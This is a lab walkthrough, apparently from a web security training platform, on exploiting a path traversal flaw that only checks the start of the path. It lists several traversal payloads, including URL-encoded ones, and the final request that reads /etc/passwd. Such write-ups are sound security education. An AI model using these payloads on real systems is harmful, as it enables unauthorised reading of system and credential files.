# 🧪 Lab: File Path Traversal (Validation of Start of Path)

## 🎯 Objective

Exploit a path traversal vulnerability to retrieve the contents of:

```id="pz7k2a"
/etc/passwd
```

<img width="983" height="410" alt="1 lab" src="https://github.com/user-attachments/assets/bc8e3600-e914-457c-ab71-8c656e93b9ac" />

---

## 🔍 Lab Overview

* The application uses a **full file path** in the request.
* It validates that the path **starts with a specific directory**:

  ```
  /var/www/images/
  ```

👉 **Key flaw:** It only checks the *start* of the path, not the final resolved location.

---

## 🚶 Step-by-Step Solution

### 🖼️ 1. Capture Image Request

* Navigate to any product page.

* Intercept request:

  ```
  GET /image?filename=x.jpg HTTP/2
  ```

* Send it to **Repeater**.

<img width="780" height="721" alt="2 image-intercept" src="https://github.com/user-attachments/assets/9b110eaa-2d54-46d6-a92f-616fb09f5dbf" />

---

### 🧪 2. Try Common Path Traversal Payloads (All Fail)

#### Attempt 1:

```id="c1q8ns"
../../../etc/passwd
```

#### Attempt 2:

```id="y7m4hf"
/etc/passwd
```

#### Attempt 3:

```id="m8zn2r"
....//....//....//etc/passwd
```

#### Attempt 4 (Single Encoding):

```id="2r9kdl"
..%2f..%2f..%2fetc%2fpasswd
```

#### Attempt 5 (Double Encoding):

```id="d0s8xp"
..%252f..%252f..%252fetc%252fpasswd
```

* Result for all:

  ```
  400 Bad Request
  No such file
  ```

---

### 🧠 3. Why All These Payloads Fail

👉 The application enforces:

```
Path must start with /var/www/images/
```

* All previous payloads:

  * Do **not** start with this directory
  * Are rejected immediately

👉 **Important insight:**

* This is not about filtering `../`
* It’s about **prefix validation**

---

### 💡 4. Craft the Correct Payload

* Include the required base path:

  ```
  /var/www/images/
  ```

* Then traverse backwards:

  ```
  /var/www/images/../../../etc/passwd
  ```

---

### 🚀 5. Send Exploit Request

* Final request:

  ```
  GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
  ```

* Send the request.

* Result:

  ```
  HTTP/2 200 OK
  ```

* Response:

  ```
  Contents of /etc/passwd
  ```

<img width="1175" height="760" alt="2 success" src="https://github.com/user-attachments/assets/6208eda8-5edc-4168-8bec-f3bd0ac54c43" />

---

### 📄 6. Why This Works

👉 **Step-by-step:**

1. Input starts with:

   ```
   /var/www/images/
   ```

   ✅ Passes validation

2. Path traversal occurs:

   ```
   ../../../
   ```

3. Final resolved path:

   ```
   /etc/passwd
   ```

👉 **Key Insight:**

* Validation checks only the **input string**
* It does NOT check the **resolved file path**

---

### ✅ 7. Lab Solved

* Successfully accessed:

  ```
  /etc/passwd
  ```
* Lab is complete.

<img width="921" height="697" alt="3 lab-solved" src="https://github.com/user-attachments/assets/8f9b07ec-d152-4536-9240-10ebb832be4f" />

---


## 🧠 Why This Attack Works

* The application:

  * Checks only if input *starts with* `/var/www/images/`
  * Does not normalize or resolve the path before validation

* Attacker strategy:

  1. Provide valid starting path
  2. Append traversal sequences
  3. Escape directory and access sensitive files

---

